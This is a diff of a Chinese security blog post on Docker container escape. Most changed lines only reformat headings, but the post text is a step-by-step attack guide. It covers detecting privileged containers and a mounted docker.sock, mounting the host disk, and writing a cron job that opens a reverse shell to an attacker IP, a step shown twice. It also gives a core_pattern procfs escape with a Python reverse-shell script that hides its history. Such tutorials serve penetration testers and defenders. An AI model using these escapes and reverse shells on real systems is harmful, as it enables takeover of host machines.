@@ -11,7 +11,7 @@
   <meta itemprop="name" content="docker逃逸">
   <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
   <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
-  <meta itemprop="wordCount" content="926">
+  <meta itemprop="wordCount" content="902">
   <meta itemprop="keywords" content="攻防,云安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BA%91%E5%AE%89%E5%85%A8/72/">
   <meta property="og:site_name" content="东隅 Blog">
   <meta property="og:title" content="docker逃逸">
@@ -37,7 +37,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F\/%E4%BA%91%E5%AE%89%E5%85%A8\/72\/"
-    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 云安全","wordcount":  926 ,
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 云安全","wordcount":  902 ,
     "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F\/%E4%BA%91%E5%AE%89%E5%85%A8\/72\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
       "@type": "Organization",
       "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
@@ -144,7 +144,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Docker逃逸</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="926 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1000 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>5 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="902 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1000 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>5 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -152,33 +152,60 @@
         </div>
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#特权模式逃逸">特权模式逃逸</a>
       <ul>
-        <li></li>
+        <li><a href="#如何判断是否为特权模式">如何判断是否为特权模式</a></li>
+        <li><a href="#逃逸">逃逸</a></li>
+      </ul>
+    </li>
+    <li><a href="#sock挂载">sock挂载</a>
+      <ul>
+        <li><a href="#逃逸-1">逃逸</a></li>
+      </ul>
+    </li>
+    <li><a href="#挂载-procfs">挂载 procfs</a></li>
+    <li><a href="#挂载宿主机根目录">挂载宿主机根目录</a></li>
+    <li><a href="#remote-api未授权访问">Remote API未授权访问</a>
+      <ul>
+        <li><a href="#未授权访问">未授权访问</a></li>
+        <li><a href="#逃逸-2">逃逸</a></li>
+      </ul>
+    </li>
+    <li><a href="#容器服务缺陷逃逸">容器服务缺陷逃逸</a>
+      <ul>
+        <li><a href="#影响版本">影响版本</a></li>
+        <li><a href="#环境搭建">环境搭建</a></li>
+        <li><a href="#逃逸-3">逃逸</a></li>
       </ul>
     </li>
   </ul>
+
+  <ul>
+    <li><a href="#cve-2016-5195-dirtycow-脏牛逃逸">CVE-2016-5195 DirtyCow 脏牛逃逸</a></li>
+    <li><a href="#cve-2020-14386">CVE-2020-14386</a></li>
+    <li><a href="#cve-2022-0847-dirtypipe-逃逸">CVE-2022-0847 DirtyPipe 逃逸</a></li>
+  </ul>
 </nav></div>
-      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="原理" class="heading-element"><span>0.0.0.1  原理</span>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="原理" class="heading-element"><span>原理</span>
   <a href="#%e5%8e%9f%e7%90%86" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>docker其实就是一个linux下的进程，它通过NameSpace 等命令实现了内核级别环境隔离（文件、网络、资源），所以相比虚拟机而言，Docker 的隔离性要弱上不少 ，这就导致可以通过很多方法来进行docker逃逸。</p>
-<h5 id="docker-环境判断" class="heading-element"><span>0.0.0.2  Docker 环境判断</span>
+</h1><p>docker其实就是一个linux下的进程，它通过NameSpace 等命令实现了内核级别环境隔离（文件、网络、资源），所以相比虚拟机而言，Docker 的隔离性要弱上不少 ，这就导致可以通过很多方法来进行docker逃逸。</p>
+<h1 id="docker-环境判断" class="heading-element"><span>Docker 环境判断</span>
   <a href="#docker-%e7%8e%af%e5%a2%83%e5%88%a4%e6%96%ad" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>1、查找.dockerenv文件</p>
+</h1><p>1、查找.dockerenv文件</p>
 <p>docker下默认存在dockerenv文件，而非docker环境中则没有</p>
 <p>2、查询cgroup进程</p>
 <pre tabindex="0"><code>cat /proc/1/cgroup</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081626091.webp" alt="image-20240408162611877" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081626091.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081626091.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081626091.webp?size=large 2x" data-title="image-20240408162611877" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>3、查看容器环境变量</p>
 <pre tabindex="0"><code>cat /proc/1/environ</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081626397.webp" alt="image-20240408162643240" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081626397.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081626397.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081626397.webp?size=large 2x" data-title="image-20240408162643240" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h5 id="逃逸漏洞汇总" class="heading-element"><span>0.0.0.3  逃逸漏洞汇总</span>
+<h1 id="逃逸漏洞汇总" class="heading-element"><span>逃逸漏洞汇总</span>
   <a href="#%e9%80%83%e9%80%b8%e6%bc%8f%e6%b4%9e%e6%b1%87%e6%80%bb" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><pre tabindex="0"><code>1、Docker 自身漏洞
+</h1><pre tabindex="0"><code>1、Docker 自身漏洞
 cve-2017-1002101
 cve-2018-1002100
 cve-2018-15664 符号链接替换漏洞
@@ -196,31 +223,34 @@ cve-2021-25741
 cve-2021-30465
 cve-2022-0492
 
-#####2、内核漏洞
+#2、内核漏洞
 cve-2016-5195 DirtyCow
 cve-2017-1000112
 cve-2020-14386
 cve-2021-22555
 cve-2022-0847 DirtyPipe
 
-#####3、不安全的配置
+#3、不安全的配置
 privileged-container
 mount-docker-sock
 mount-host-etc
 mount-host-procfs
 mount-var-log
 cap_dac_read_search-container
-cap_sys_admin-container</code></pre><h5 id="0x01-不安全的配置" class="heading-element"><span>0.0.0.4  0x01 不安全的配置</span>
+cap_sys_admin-container</code></pre><h1 id="0x01-不安全的配置" class="heading-element"><span>0x01 不安全的配置</span>
   <a href="#0x01-%e4%b8%8d%e5%ae%89%e5%85%a8%e7%9a%84%e9%85%8d%e7%bd%ae" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="特权模式逃逸" class="heading-element"><span>0.0.0.4.1  特权模式逃逸</span>
+</h1><h2 id="特权模式逃逸" class="heading-element"><span>特权模式逃逸</span>
   <a href="#%e7%89%b9%e6%9d%83%e6%a8%a1%e5%bc%8f%e9%80%83%e9%80%b8" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>以特权模式启动时，docker容器内拥有宿主机文件读写权限，可以通过写ssh密钥、计划任务等方式达到逃逸。</p>
-<p>####### 如何判断是否为特权模式</p>
-<blockquote>
+</h2><p>以特权模式启动时，docker容器内拥有宿主机文件读写权限，可以通过写ssh密钥、计划任务等方式达到逃逸。</p>
+<h3 id="如何判断是否为特权模式" class="heading-element"><span>如何判断是否为特权模式</span>
+  <a href="#%e5%a6%82%e4%bd%95%e5%88%a4%e6%96%ad%e6%98%af%e5%90%a6%e4%b8%ba%e7%89%b9%e6%9d%83%e6%a8%a1%e5%bc%8f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><blockquote>
 <p>执行以下命令，如果返回 Is privileged mode 则说明当前是特权模式</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /proc/self/status | grep -qi <span style="color:#a6be9d">&#34;0000003fffffffff&#34;</span> <span style="color:#ff636f">&amp;&amp;</span> <span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#34;Is privileged mode&#34;</span> <span style="color:#ff636f">||</span> <span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#34;Not privileged mode&#34;</span></span></span></code></pre></div><p>如果返回 Not privileged mode 则说明当前不是特权模式</p>
 </blockquote>
@@ -418,19 +448,22 @@ CapAmb: 0000000000000000</code></pre><p>CapEff 主要是检查线程的执行权
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081629442.webp" alt="image-20240408162922307" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081629442.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081629442.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081629442.webp?size=large 2x" data-title="image-20240408162922307" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>而非特权容器的 Cap 集合值并进行解码，发现并不存在 NET_ADMIN</p>
 <p>因此当执行 <code>cat /proc/1/status | grep Cap</code> 查询对应出来的值为 <code>0000003fffffffff</code> 那么就有可能是特权容器，可尝试逃逸</p>
-<p>####### 逃逸</p>
-<p>1、首先以特权模式运行一个docker容器</p>
+<h3 id="逃逸" class="heading-element"><span>逃逸</span>
+  <a href="#%e9%80%83%e9%80%b8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>1、首先以特权模式运行一个docker容器</p>
 <pre tabindex="0"><code>docker run -it --privileged 镜像id /bin/bash</code></pre><p>2、查看磁盘文件</p>
 <pre tabindex="0"><code>fdisk -l</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081630466.webp" alt="image-20240408163001344" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081630466.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081630466.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081630466.webp?size=large 2x" data-title="image-20240408163001344" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>3、新建一个目录,将/dev/vda1挂载至新建的目录</p>
 <pre tabindex="0"><code>mkdir /test
 mount /dev/vda1 /test</code></pre><p>4、写入计划任务到宿主机</p>
 <pre tabindex="0"><code>echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/ip/4000 0&gt;&amp;1&#39; &gt;&gt; /test/var/spool/cron/root</code></pre><p>5、成功反弹shell</p>
-<h6 id="sock挂载" class="heading-element"><span>0.0.0.4.2  sock挂载</span>
+<h2 id="sock挂载" class="heading-element"><span>sock挂载</span>
   <a href="#sock%e6%8c%82%e8%bd%bd" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <p>执行以下命令，如果返回 Docker Socket is mounted. 说明当前挂载了 Docker Socket</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls /var/run/ | grep -qi docker.sock <span style="color:#ff636f">&amp;&amp;</span> <span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#34;Docker Socket is mounted.&#34;</span> <span style="color:#ff636f">||</span> <span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#34;Docker Socket is not mounted.&#34;</span></span></span></code></pre></div><p>如果返回 Docker Socket is not mounted. 则说明没有挂载</p>
 </blockquote>
@@ -440,8 +473,11 @@ mount /dev/vda1 /test</code></pre><p>4、写入计划任务到宿主机</p>
 3、fd://socketfd</code></pre><p>其中使用docker.sock进行通信为默认方式，当容器中进程需在生产过程中与Docker守护进程通信时，容器本身需要挂载/var/run/docker.sock文件。
 本质上而言，能够访问docker socket 或连接HTTPS API的进程可以执行Docker服务能够运行的任意命令，以root权限运行的Docker服务通常可以访问整个主机系统。
 因此，当容器访问docker socket时，我们可通过与docker daemon的通信对其进行恶意操纵完成逃逸。若容器A可以访问docker socket，我们便可在其内部安装client（docker），通过docker.sock与宿主机的server（docker daemon）进行交互，运行并切换至不安全的容器B，最终在容器B中控制宿主机。</p>
-<p>####### 逃逸</p>
-<p>1、运行一个挂载/var/run/的容器</p>
+<h3 id="逃逸-1" class="heading-element"><span>逃逸</span>
+  <a href="#%e9%80%83%e9%80%b8-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>1、运行一个挂载/var/run/的容器</p>
 <pre tabindex="0"><code>docker run -it -v /var/run/:/host/var/run/ 5d2df19066ac /bin/bash</code></pre><p>2、寻找下挂载的sock文件</p>
 <pre tabindex="0"><code>find / -name docker.sock</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081630694.webp" alt="image-20240408163036573" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081630694.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081630694.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081630694.webp?size=large 2x" data-title="image-20240408163036573" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>3、在容器内安装client，即docker</p>
@@ -450,11 +486,11 @@ apt-get install docker.io</code></pre><p>4、查看宿主机docker信息</p>
 <pre tabindex="0"><code>docker -H unix:///host/var/run/docker.sock info</code></pre><p>5、运行一个新容器并挂载宿主机根路径</p>
 <pre tabindex="0"><code>docker -H unix:///host/var/run/docker.sock run -v /:/test -it ubuntu:14.04 /bin/bash</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081630075.webp" alt="image-20240408163054893" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081630075.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081630075.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081630075.webp?size=large 2x" data-title="image-20240408163054893" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>6、写入计划任务到宿主机</p>
-<pre tabindex="0"><code>echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/ip/4000 0&gt;&amp;1&#39; &gt;&gt; /test/var/spool/cron/root</code></pre><h6 id="挂载-procfs" class="heading-element"><span>0.0.0.4.3  挂载 procfs</span>
+<pre tabindex="0"><code>echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/ip/4000 0&gt;&amp;1&#39; &gt;&gt; /test/var/spool/cron/root</code></pre><h2 id="挂载-procfs" class="heading-element"><span>挂载 procfs</span>
   <a href="#%e6%8c%82%e8%bd%bd-procfs" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <p>procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User Namespace时。</p>
 <p>Docker默认情况下不会为容器开启 User Namespace</p>
 <p>从 2.6.19 内核版本开始，Linux 支持在 /proc/sys/kernel/core_pattern 中使用新语法。如果该文件中的首个字符是管道符 | ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。</p>
@@ -470,7 +506,7 @@ apt-get update -y &amp;&amp; apt-get install vim gcc -y
 vim /tmp/.t.py
 
 创建一个反弹 Shell 的 py 脚本
-#####!/usr/bin/python3
+#!/usr/bin/python3
 import  os
 import pty
 import socket
@@ -484,7 +520,7 @@ def main():
    os.dup2(s.fileno(), 2)
    os.putenv(&#34;HISTFILE&#34;, &#39;/dev/null&#39;)
    pty.spawn(&#34;/bin/bash&#34;)
-##### os.remove(&#39;/tmp/.t.py&#39;)
+   # os.remove(&#39;/tmp/.t.py&#39;)
    s.close()
 if __name__ == &#34;__main__&#34;:
    main()
